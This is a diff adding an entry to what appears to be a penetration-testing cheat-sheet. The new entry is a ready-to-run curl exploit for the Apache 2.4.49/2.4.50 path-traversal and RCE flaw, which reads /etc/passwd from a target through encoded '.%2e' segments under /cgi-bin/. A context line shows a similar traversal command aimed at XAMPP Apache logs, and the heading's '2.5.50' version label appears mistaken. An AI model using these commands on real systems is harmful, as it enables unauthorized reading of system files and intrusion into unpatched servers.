@@ -94,3 +94,10 @@ curl -s --path-as-is $TARGET_URL/../../../../../../../../../xampp/apache/logs/ac
 ```
 
 
+Apache 2.4.49 / Apache 2.5.50 Path traversal and RCE:
+---
+#apache-rce #apache-2449 #apache-2550 
+read /etc/passwd:
+```bash
+curl -s --path-as-is -d "echo Content-Type: text/plain; echo; " "$TARGET_IP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+```
